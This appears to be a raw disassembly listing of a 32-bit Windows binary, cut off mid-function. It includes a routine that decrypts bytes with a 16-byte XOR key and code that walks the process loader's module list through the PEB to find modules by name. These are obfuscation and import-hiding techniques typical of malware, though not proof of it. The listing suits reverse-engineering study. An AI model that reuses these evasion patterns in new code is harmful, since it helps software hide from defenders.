  401f30:	8b 45 08             	mov    0x8(%ebp),%eax
  401f33:	8d 40 04             	lea    0x4(%eax),%eax
  401f36:	31 c9                	xor    %ecx,%ecx
  401f38:	31 d2                	xor    %edx,%edx
  401f3a:	66 66 66 66 66 2e 0f 	data16 data16 data16 data16 nopw %cs:0x0(%eax,%eax,1)
  401f41:	1f 84 00 00 00 00 00 
  401f48:	83 7d e8 0f          	cmpl   $0xf,-0x18(%ebp)
  401f4c:	77 0a                	ja     0x401f58
  401f4e:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  401f51:	eb 08                	jmp    0x401f5b
  401f53:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  401f58:	8b 75 d4             	mov    -0x2c(%ebp),%esi
  401f5b:	0f b6 1c 16          	movzbl (%esi,%edx,1),%ebx
  401f5f:	89 d6                	mov    %edx,%esi
  401f61:	83 e6 0f             	and    $0xf,%esi
  401f64:	8b 7d ec             	mov    -0x14(%ebp),%edi
  401f67:	0f b6 34 37          	movzbl (%edi,%esi,1),%esi
  401f6b:	8b 7d 08             	mov    0x8(%ebp),%edi
  401f6e:	83 7f 18 10          	cmpl   $0x10,0x18(%edi)
  401f72:	89 c7                	mov    %eax,%edi
  401f74:	72 02                	jb     0x401f78
  401f76:	8b 38                	mov    (%eax),%edi
  401f78:	01 cb                	add    %ecx,%ebx
  401f7a:	31 f3                	xor    %esi,%ebx
  401f7c:	88 1c 17             	mov    %bl,(%edi,%edx,1)
  401f7f:	42                   	inc    %edx
  401f80:	49                   	dec    %ecx
  401f81:	3b 55 e4             	cmp    -0x1c(%ebp),%edx
  401f84:	72 c2                	jb     0x401f48
  401f86:	eb 06                	jmp    0x401f8e
  401f88:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  401f8c:	74 0e                	je     0x401f9c
  401f8e:	83 ec 0c             	sub    $0xc,%esp
  401f91:	ff 75 ec             	push   -0x14(%ebp)
  401f94:	e8 83 44 00 00       	call   0x40641c
  401f99:	83 c4 10             	add    $0x10,%esp
  401f9c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  401f9f:	83 f9 10             	cmp    $0x10,%ecx
  401fa2:	72 1b                	jb     0x401fbf
  401fa4:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401fa7:	41                   	inc    %ecx
  401fa8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401fae:	72 03                	jb     0x401fb3
  401fb0:	8b 40 fc             	mov    -0x4(%eax),%eax
  401fb3:	83 ec 0c             	sub    $0xc,%esp
  401fb6:	50                   	push   %eax
  401fb7:	e8 70 44 00 00       	call   0x40642c
  401fbc:	83 c4 10             	add    $0x10,%esp
  401fbf:	83 ec 0c             	sub    $0xc,%esp
  401fc2:	8d 85 58 ff ff ff    	lea    -0xa8(%ebp),%eax
  401fc8:	50                   	push   %eax
  401fc9:	e8 54 00 02 00       	call   0x422022
  401fce:	83 c4 10             	add    $0x10,%esp
  401fd1:	8b 45 08             	mov    0x8(%ebp),%eax
  401fd4:	81 c4 ac 00 00 00    	add    $0xac,%esp
  401fda:	5e                   	pop    %esi
  401fdb:	5f                   	pop    %edi
  401fdc:	5b                   	pop    %ebx
  401fdd:	5d                   	pop    %ebp
  401fde:	c3                   	ret
  401fdf:	c7 85 60 ff ff ff 04 	movl   $0x4,-0xa0(%ebp)
  401fe6:	00 00 00 
  401fe9:	83 ec 0c             	sub    $0xc,%esp
  401fec:	68 30 35 42 00       	push   $0x423530
  401ff1:	e8 a2 cc 00 00       	call   0x40ec98
  401ff6:	83 c4 0c             	add    $0xc,%esp
  401ff9:	8b 85 5c ff ff ff    	mov    -0xa4(%ebp),%eax
  401fff:	3d 05 00 00 00       	cmp    $0x5,%eax
  402004:	76 02                	jbe    0x402008
  402006:	0f 0b                	ud2
  402008:	2d 01 00 00 00       	sub    $0x1,%eax
  40200d:	ff 24 85 c8 20 40 00 	jmp    *0x4020c8(,%eax,4)
  402014:	eb 4f                	jmp    0x402065
  402016:	eb 4d                	jmp    0x402065
  402018:	8b b5 64 ff ff ff    	mov    -0x9c(%ebp),%esi
  40201e:	8b bd 68 ff ff ff    	mov    -0x98(%ebp),%edi
  402024:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402027:	83 f8 10             	cmp    $0x10,%eax
  40202a:	72 23                	jb     0x40204f
  40202c:	8b 4d 9c             	mov    -0x64(%ebp),%ecx
  40202f:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  402032:	40                   	inc    %eax
  402033:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402038:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40203b:	72 06                	jb     0x402043
  40203d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402040:	8b 40 fc             	mov    -0x4(%eax),%eax
  402043:	83 ec 0c             	sub    $0xc,%esp
  402046:	50                   	push   %eax
  402047:	e8 e0 43 00 00       	call   0x40642c
  40204c:	83 c4 10             	add    $0x10,%esp
  40204f:	c7 45 b0 0f 00 00 00 	movl   $0xf,-0x50(%ebp)
  402056:	c7 45 ac 00 00 00 00 	movl   $0x0,-0x54(%ebp)
  40205d:	c6 45 9c 00          	movb   $0x0,-0x64(%ebp)
  402061:	eb 0e                	jmp    0x402071
  402063:	eb 00                	jmp    0x402065
  402065:	8b b5 64 ff ff ff    	mov    -0x9c(%ebp),%esi
  40206b:	8b bd 68 ff ff ff    	mov    -0x98(%ebp),%edi
  402071:	89 bd 54 ff ff ff    	mov    %edi,-0xac(%ebp)
  402077:	89 75 90             	mov    %esi,-0x70(%ebp)
  40207a:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40207d:	89 45 c8             	mov    %eax,-0x38(%ebp)
  402080:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402083:	83 f8 10             	cmp    $0x10,%eax
  402086:	72 26                	jb     0x4020ae
  402088:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40208b:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40208e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  402091:	40                   	inc    %eax
  402092:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402097:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40209a:	72 06                	jb     0x4020a2
  40209c:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40209f:	8b 40 fc             	mov    -0x4(%eax),%eax
  4020a2:	83 ec 0c             	sub    $0xc,%esp
  4020a5:	50                   	push   %eax
  4020a6:	e8 81 43 00 00       	call   0x40642c
  4020ab:	83 c4 10             	add    $0x10,%esp
  4020ae:	8b 45 90             	mov    -0x70(%ebp),%eax
  4020b1:	c7 85 60 ff ff ff ff 	movl   $0xffffffff,-0xa0(%ebp)
  4020b8:	ff ff ff 
  4020bb:	83 ec 0c             	sub    $0xc,%esp
  4020be:	50                   	push   %eax
  4020bf:	e8 dc fe 01 00       	call   0x421fa0
  4020c4:	83 c4 0c             	add    $0xc,%esp
  4020c7:	90                   	nop
  4020c8:	14 20                	adc    $0x20,%al
  4020ca:	40                   	inc    %eax
  4020cb:	00 16                	add    %dl,(%esi)
  4020cd:	20 40 00             	and    %al,0x0(%eax)
  4020d0:	18 20                	sbb    %ah,(%eax)
  4020d2:	40                   	inc    %eax
  4020d3:	00 63 20             	add    %ah,0x20(%ebx)
  4020d6:	40                   	inc    %eax
  4020d7:	00 65 20             	add    %ah,0x20(%ebp)
  4020da:	40                   	inc    %eax
  4020db:	00 55 89             	add    %dl,-0x77(%ebp)
  4020de:	e5 53                	in     $0x53,%eax
  4020e0:	57                   	push   %edi
  4020e1:	56                   	push   %esi
  4020e2:	81 ec ac 00 00 00    	sub    $0xac,%esp
  4020e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4020eb:	c7 45 b8 0f 00 00 00 	movl   $0xf,-0x48(%ebp)
  4020f2:	c7 45 b4 00 00 00 00 	movl   $0x0,-0x4c(%ebp)
  4020f9:	c6 45 a4 00          	movb   $0x0,-0x5c(%ebp)
  4020fd:	89 44 24 04          	mov    %eax,0x4(%esp)
  402101:	8d 45 a0             	lea    -0x60(%ebp),%eax
  402104:	89 04 24             	mov    %eax,(%esp)
  402107:	e8 78 2b 00 00       	call   0x404c84
  40210c:	83 7d b8 0f          	cmpl   $0xf,-0x48(%ebp)
  402110:	8b 75 b4             	mov    -0x4c(%ebp),%esi
  402113:	77 05                	ja     0x40211a
  402115:	8d 7d a4             	lea    -0x5c(%ebp),%edi
  402118:	eb 03                	jmp    0x40211d
  40211a:	8b 7d a4             	mov    -0x5c(%ebp),%edi
  40211d:	c7 45 d8 07 00 00 00 	movl   $0x7,-0x28(%ebp)
  402124:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  40212b:	66 c7 45 c4 00 00    	movw   $0x0,-0x3c(%ebp)
  402131:	c7 45 84 98 13 42 00 	movl   $0x421398,-0x7c(%ebp)
  402138:	c7 45 88 7c 35 42 00 	movl   $0x42357c,-0x78(%ebp)
  40213f:	89 6d 8c             	mov    %ebp,-0x74(%ebp)
  402142:	89 65 94             	mov    %esp,-0x6c(%ebp)
  402145:	c7 45 8c 9c 22 40 00 	movl   $0x40229c,-0x74(%ebp)
  40214c:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  402152:	e8 aa fe 01 00       	call   0x422001
  402157:	83 fe 07             	cmp    $0x7,%esi
  40215a:	74 4b                	je     0x4021a7
  40215c:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40215f:	c7 85 70 ff ff ff 01 	movl   $0x1,-0x90(%ebp)
  402166:	00 00 00 
  402169:	89 75 ec             	mov    %esi,-0x14(%ebp)
  40216c:	89 74 24 04          	mov    %esi,0x4(%esp)
  402170:	8d 45 c0             	lea    -0x40(%ebp),%eax
  402173:	89 04 24             	mov    %eax,(%esp)
  402176:	c7 44 24 08 01 00 00 	movl   $0x1,0x8(%esp)
  40217d:	00 
  40217e:	e8 75 2e 00 00       	call   0x404ff8
  402183:	84 c0                	test   %al,%al
  402185:	8b 75 ec             	mov    -0x14(%ebp),%esi
  402188:	8b 7d f0             	mov    -0x10(%ebp),%edi
  40218b:	74 1a                	je     0x4021a7
  40218d:	83 7d d8 07          	cmpl   $0x7,-0x28(%ebp)
  402191:	77 05                	ja     0x402198
  402193:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  402196:	eb 03                	jmp    0x40219b
  402198:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40219b:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  4021a2:	66 c7 00 00 00       	movw   $0x0,(%eax)
  4021a7:	01 fe                	add    %edi,%esi
  4021a9:	c7 85 70 ff ff ff 02 	movl   $0x2,-0x90(%ebp)
  4021b0:	00 00 00 
  4021b3:	8a 45 e8             	mov    -0x18(%ebp),%al
  4021b6:	88 44 24 0c          	mov    %al,0xc(%esp)
  4021ba:	89 74 24 08          	mov    %esi,0x8(%esp)
  4021be:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4021c2:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4021c5:	89 04 24             	mov    %eax,(%esp)
  4021c8:	e8 27 2c 00 00       	call   0x404df4
  4021cd:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  4021d3:	8b 40 0c             	mov    0xc(%eax),%eax
  4021d6:	8b 48 0c             	mov    0xc(%eax),%ecx
  4021d9:	83 79 18 00          	cmpl   $0x0,0x18(%ecx)
  4021dd:	74 58                	je     0x402237
  4021df:	8d 51 18             	lea    0x18(%ecx),%edx
  4021e2:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  4021e9:	00 00 00 
  4021ec:	8b 41 30             	mov    0x30(%ecx),%eax
  4021ef:	83 7d d8 07          	cmpl   $0x7,-0x28(%ebp)
  4021f3:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4021f6:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4021f9:	77 11                	ja     0x40220c
  4021fb:	8d 4d c4             	lea    -0x3c(%ebp),%ecx
  4021fe:	eb 0f                	jmp    0x40220f
  402200:	66 66 66 2e 0f 1f 84 	data16 data16 nopw %cs:0x0(%eax,%eax,1)
  402207:	00 00 00 00 00 
  40220c:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  40220f:	c7 85 70 ff ff ff 03 	movl   $0x3,-0x90(%ebp)
  402216:	00 00 00 
  402219:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40221d:	89 04 24             	mov    %eax,(%esp)
  402220:	e8 5f 02 01 00       	call   0x412484
  402225:	85 c0                	test   %eax,%eax
  402227:	74 12                	je     0x40223b
  402229:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40222c:	8b 09                	mov    (%ecx),%ecx
  40222e:	8d 51 18             	lea    0x18(%ecx),%edx
  402231:	83 79 18 00          	cmpl   $0x0,0x18(%ecx)
  402235:	75 b5                	jne    0x4021ec
  402237:	31 f6                	xor    %esi,%esi
  402239:	eb 05                	jmp    0x402240
  40223b:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40223e:	8b 30                	mov    (%eax),%esi
  402240:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  402243:	83 f9 08             	cmp    $0x8,%ecx
  402246:	72 1a                	jb     0x402262
  402248:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  40224b:	8d 4c 09 02          	lea    0x2(%ecx,%ecx,1),%ecx
  40224f:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402255:	72 03                	jb     0x40225a
  402257:	8b 40 fc             	mov    -0x4(%eax),%eax
  40225a:	89 04 24             	mov    %eax,(%esp)
  40225d:	e8 ca 41 00 00       	call   0x40642c
  402262:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  402265:	83 f9 10             	cmp    $0x10,%ecx
  402268:	72 17                	jb     0x402281
  40226a:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  40226d:	41                   	inc    %ecx
  40226e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  402274:	72 03                	jb     0x402279
  402276:	8b 40 fc             	mov    -0x4(%eax),%eax
  402279:	89 04 24             	mov    %eax,(%esp)
  40227c:	e8 ab 41 00 00       	call   0x40642c
  402281:	8d 85 68 ff ff ff    	lea    -0x98(%ebp),%eax
  402287:	89 04 24             	mov    %eax,(%esp)
  40228a:	e8 93 fd 01 00       	call   0x422022
  40228f:	89 f0                	mov    %esi,%eax
  402291:	81 c4 ac 00 00 00    	add    $0xac,%esp
  402297:	5e                   	pop    %esi
  402298:	5f                   	pop    %edi
  402299:	5b                   	pop    %ebx
  40229a:	5d                   	pop    %ebp
  40229b:	c3                   	ret
  40229c:	8b 85 6c ff ff ff    	mov    -0x94(%ebp),%eax
  4022a2:	3d 03 00 00 00       	cmp    $0x3,%eax
  4022a7:	76 02                	jbe    0x4022ab
  4022a9:	0f 0b                	ud2
  4022ab:	2d 01 00 00 00       	sub    $0x1,%eax
  4022b0:	ff 24 85 60 23 40 00 	jmp    *0x402360(,%eax,4)
  4022b7:	8b b5 74 ff ff ff    	mov    -0x8c(%ebp),%esi
  4022bd:	8b bd 78 ff ff ff    	mov    -0x88(%ebp),%edi
  4022c3:	eb 4a                	jmp    0x40230f
  4022c5:	8b b5 74 ff ff ff    	mov    -0x8c(%ebp),%esi
  4022cb:	8b bd 78 ff ff ff    	mov    -0x88(%ebp),%edi
  4022d1:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4022d4:	83 f8 08             	cmp    $0x8,%eax
  4022d7:	72 22                	jb     0x4022fb
  4022d9:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  4022dc:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4022df:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4022e3:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4022e8:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4022eb:	72 06                	jb     0x4022f3
  4022ed:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4022f0:	8b 40 fc             	mov    -0x4(%eax),%eax
  4022f3:	89 04 24             	mov    %eax,(%esp)
  4022f6:	e8 31 41 00 00       	call   0x40642c
  4022fb:	c7 45 d8 07 00 00 00 	movl   $0x7,-0x28(%ebp)
  402302:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  402309:	66 c7 45 c4 00 00    	movw   $0x0,-0x3c(%ebp)
  40230f:	89 bd 64 ff ff ff    	mov    %edi,-0x9c(%ebp)
  402315:	89 75 bc             	mov    %esi,-0x44(%ebp)
  402318:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40231b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40231e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402321:	83 f8 10             	cmp    $0x10,%eax
  402324:	72 22                	jb     0x402348
  402326:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  402329:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40232c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40232f:	40                   	inc    %eax
  402330:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402335:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402338:	72 06                	jb     0x402340
  40233a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40233d:	8b 40 fc             	mov    -0x4(%eax),%eax
  402340:	89 04 24             	mov    %eax,(%esp)
  402343:	e8 e4 40 00 00       	call   0x40642c
  402348:	8b 45 bc             	mov    -0x44(%ebp),%eax
  40234b:	c7 85 70 ff ff ff ff 	movl   $0xffffffff,-0x90(%ebp)
  402352:	ff ff ff 
  402355:	89 04 24             	mov    %eax,(%esp)
  402358:	e8 43 fc 01 00       	call   0x421fa0
  40235d:	83 ec 04             	sub    $0x4,%esp
  402360:	b7 22                	mov    $0x22,%bh
  402362:	40                   	inc    %eax
  402363:	00 b7 22 40 00 c5    	add    %dh,-0x3affbfde(%edi)
  402369:	22 40 00             	and    0x0(%eax),%al
  40236c:	55                   	push   %ebp
  40236d:	89 e5                	mov    %esp,%ebp
  40236f:	53                   	push   %ebx
  402370:	57                   	push   %edi
  402371:	56                   	push   %esi
  402372:	83 ec 6c             	sub    $0x6c,%esp
  402375:	8a 1d 08 ed 4a 00    	mov    0x4aed08,%bl
  40237b:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  402382:	c7 45 bc 94 35 42 00 	movl   $0x423594,-0x44(%ebp)
  402389:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  40238c:	89 65 c8             	mov    %esp,-0x38(%ebp)
  40238f:	c7 45 c0 44 24 40 00 	movl   $0x402444,-0x40(%ebp)
  402396:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402399:	89 f8                	mov    %edi,%eax
  40239b:	e8 61 fc 01 00       	call   0x422001
  4023a0:	84 db                	test   %bl,%bl
  4023a2:	75 78                	jne    0x40241c
  4023a4:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4023ab:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4023b2:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4023b6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4023bd:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4023c0:	89 34 24             	mov    %esi,(%esp)
  4023c3:	c7 44 24 04 e0 30 42 	movl   $0x4230e0,0x4(%esp)
  4023ca:	00 
  4023cb:	e8 b4 28 00 00       	call   0x404c84
  4023d0:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  4023d7:	89 74 24 04          	mov    %esi,0x4(%esp)
  4023db:	c7 04 24 ec ec 4a 00 	movl   $0x4aecec,(%esp)
  4023e2:	e8 11 f9 ff ff       	call   0x401cf8
  4023e7:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4023ea:	83 f9 10             	cmp    $0x10,%ecx
  4023ed:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4023f0:	72 17                	jb     0x402409
  4023f2:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4023f5:	41                   	inc    %ecx
  4023f6:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  4023fc:	72 03                	jb     0x402401
  4023fe:	8b 40 fc             	mov    -0x4(%eax),%eax
  402401:	89 04 24             	mov    %eax,(%esp)
  402404:	e8 23 40 00 00       	call   0x40642c
  402409:	c7 04 24 b8 12 40 00 	movl   $0x4012b8,(%esp)
  402410:	e8 4b b1 01 00       	call   0x41d560
  402415:	c6 05 08 ed 4a 00 01 	movb   $0x1,0x4aed08
  40241c:	83 3d 04 ed 4a 00 0f 	cmpl   $0xf,0x4aed04
  402423:	77 07                	ja     0x40242c
  402425:	be f0 ec 4a 00       	mov    $0x4aecf0,%esi
  40242a:	eb 06                	jmp    0x402432
  40242c:	8b 35 f0 ec 4a 00    	mov    0x4aecf0,%esi
  402432:	89 3c 24             	mov    %edi,(%esp)
  402435:	e8 e8 fb 01 00       	call   0x422022
  40243a:	89 f0                	mov    %esi,%eax
  40243c:	83 c4 6c             	add    $0x6c,%esp
  40243f:	5e                   	pop    %esi
  402440:	5f                   	pop    %edi
  402441:	5b                   	pop    %ebx
  402442:	5d                   	pop    %ebp
  402443:	c3                   	ret
  402444:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402447:	3d 01 00 00 00       	cmp    $0x1,%eax
  40244c:	76 02                	jbe    0x402450
  40244e:	0f 0b                	ud2
  402450:	2d 01 00 00 00       	sub    $0x1,%eax
  402455:	ff 24 85 98 24 40 00 	jmp    *0x402498(,%eax,4)
  40245c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40245f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402462:	83 f8 10             	cmp    $0x10,%eax
  402465:	72 1f                	jb     0x402486
  402467:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40246a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40246d:	40                   	inc    %eax
  40246e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  402473:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402476:	72 06                	jb     0x40247e
  402478:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40247b:	8b 40 fc             	mov    -0x4(%eax),%eax
  40247e:	89 04 24             	mov    %eax,(%esp)
  402481:	e8 a6 3f 00 00       	call   0x40642c
  402486:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40248d:	89 34 24             	mov    %esi,(%esp)
  402490:	e8 0b fb 01 00       	call   0x421fa0
  402495:	83 ec 04             	sub    $0x4,%esp
  402498:	5c                   	pop    %esp
  402499:	24 40                	and    $0x40,%al
  40249b:	00 55 89             	add    %dl,-0x77(%ebp)
  40249e:	e5 53                	in     $0x53,%eax
  4024a0:	57                   	push   %edi
  4024a1:	56                   	push   %esi
  4024a2:	83 ec 6c             	sub    $0x6c,%esp
  4024a5:	8a 1d 28 ed 4a 00    	mov    0x4aed28,%bl
  4024ab:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  4024b2:	c7 45 bc a4 35 42 00 	movl   $0x4235a4,-0x44(%ebp)
  4024b9:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  4024bc:	89 65 c8             	mov    %esp,-0x38(%ebp)
  4024bf:	c7 45 c0 74 25 40 00 	movl   $0x402574,-0x40(%ebp)
  4024c6:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4024c9:	89 f8                	mov    %edi,%eax
  4024cb:	e8 31 fb 01 00       	call   0x422001
  4024d0:	84 db                	test   %bl,%bl
  4024d2:	75 78                	jne    0x40254c
  4024d4:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  4024db:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  4024e2:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  4024e6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4024ed:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  4024f0:	89 34 24             	mov    %esi,(%esp)
  4024f3:	c7 44 24 04 23 31 42 	movl   $0x423123,0x4(%esp)
  4024fa:	00 
  4024fb:	e8 84 27 00 00       	call   0x404c84
  402500:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402507:	89 74 24 04          	mov    %esi,0x4(%esp)
  40250b:	c7 04 24 0c ed 4a 00 	movl   $0x4aed0c,(%esp)
  402512:	e8 e1 f7 ff ff       	call   0x401cf8
  402517:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40251a:	83 f9 10             	cmp    $0x10,%ecx
  40251d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402520:	72 17                	jb     0x402539
  402522:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402525:	41                   	inc    %ecx
  402526:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40252c:	72 03                	jb     0x402531
  40252e:	8b 40 fc             	mov    -0x4(%eax),%eax
  402531:	89 04 24             	mov    %eax,(%esp)
  402534:	e8 f3 3e 00 00       	call   0x40642c
  402539:	c7 04 24 08 13 40 00 	movl   $0x401308,(%esp)
  402540:	e8 1b b0 01 00       	call   0x41d560
  402545:	c6 05 28 ed 4a 00 01 	movb   $0x1,0x4aed28
  40254c:	83 3d 24 ed 4a 00 0f 	cmpl   $0xf,0x4aed24
  402553:	77 07                	ja     0x40255c
  402555:	be 10 ed 4a 00       	mov    $0x4aed10,%esi
  40255a:	eb 06                	jmp    0x402562
  40255c:	8b 35 10 ed 4a 00    	mov    0x4aed10,%esi
  402562:	89 3c 24             	mov    %edi,(%esp)
  402565:	e8 b8 fa 01 00       	call   0x422022
  40256a:	89 f0                	mov    %esi,%eax
  40256c:	83 c4 6c             	add    $0x6c,%esp
  40256f:	5e                   	pop    %esi
  402570:	5f                   	pop    %edi
  402571:	5b                   	pop    %ebx
  402572:	5d                   	pop    %ebp
  402573:	c3                   	ret
  402574:	8b 45 a0             	mov    -0x60(%ebp),%eax
  402577:	3d 01 00 00 00       	cmp    $0x1,%eax
  40257c:	76 02                	jbe    0x402580
  40257e:	0f 0b                	ud2
  402580:	2d 01 00 00 00       	sub    $0x1,%eax
  402585:	ff 24 85 c8 25 40 00 	jmp    *0x4025c8(,%eax,4)
  40258c:	8b 75 a8             	mov    -0x58(%ebp),%esi
  40258f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402592:	83 f8 10             	cmp    $0x10,%eax
  402595:	72 1f                	jb     0x4025b6
  402597:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  40259a:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  40259d:	40                   	inc    %eax
  40259e:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4025a3:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4025a6:	72 06                	jb     0x4025ae
  4025a8:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4025ab:	8b 40 fc             	mov    -0x4(%eax),%eax
  4025ae:	89 04 24             	mov    %eax,(%esp)
  4025b1:	e8 76 3e 00 00       	call   0x40642c
  4025b6:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  4025bd:	89 34 24             	mov    %esi,(%esp)
  4025c0:	e8 db f9 01 00       	call   0x421fa0
  4025c5:	83 ec 04             	sub    $0x4,%esp
  4025c8:	8c 25 40 00 55 89    	mov    %fs,0x89550040
  4025ce:	e5 53                	in     $0x53,%eax
  4025d0:	57                   	push   %edi
  4025d1:	56                   	push   %esi
  4025d2:	83 ec 6c             	sub    $0x6c,%esp
  4025d5:	8a 1d 48 ed 4a 00    	mov    0x4aed48,%bl
  4025db:	c7 45 b8 98 13 42 00 	movl   $0x421398,-0x48(%ebp)
  4025e2:	c7 45 bc b4 35 42 00 	movl   $0x4235b4,-0x44(%ebp)
  4025e9:	89 6d c0             	mov    %ebp,-0x40(%ebp)
  4025ec:	89 65 c8             	mov    %esp,-0x38(%ebp)
  4025ef:	c7 45 c0 a4 26 40 00 	movl   $0x4026a4,-0x40(%ebp)
  4025f6:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  4025f9:	89 f8                	mov    %edi,%eax
  4025fb:	e8 01 fa 01 00       	call   0x422001
  402600:	84 db                	test   %bl,%bl
  402602:	75 78                	jne    0x40267c
  402604:	c7 45 ec 0f 00 00 00 	movl   $0xf,-0x14(%ebp)
  40260b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  402612:	c6 45 d8 00          	movb   $0x0,-0x28(%ebp)
  402616:	c7 45 a4 ff ff ff ff 	movl   $0xffffffff,-0x5c(%ebp)
  40261d:	8d 75 d4             	lea    -0x2c(%ebp),%esi
  402620:	89 34 24             	mov    %esi,(%esp)
  402623:	c7 44 24 04 60 31 42 	movl   $0x423160,0x4(%esp)
  40262a:	00 
  40262b:	e8 54 26 00 00       	call   0x404c84
  402630:	c7 45 a4 01 00 00 00 	movl   $0x1,-0x5c(%ebp)
  402637:	89 74 24 04          	mov    %esi,0x4(%esp)
  40263b:	c7 04 24 2c ed 4a 00 	movl   $0x4aed2c,(%esp)
  402642:	e8 b1 f6 ff ff       	call   0x401cf8
  402647:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40264a:	83 f9 10             	cmp    $0x10,%ecx
  40264d:	8d 7d 9c             	lea    -0x64(%ebp),%edi
  402650:	72 17                	jb     0x402669
  402652:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402655:	41                   	inc    %ecx
  402656:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  40265c:	72 03                	jb     0x402661
  40265e:	8b 40 fc             	mov    -0x4(%eax),%eax
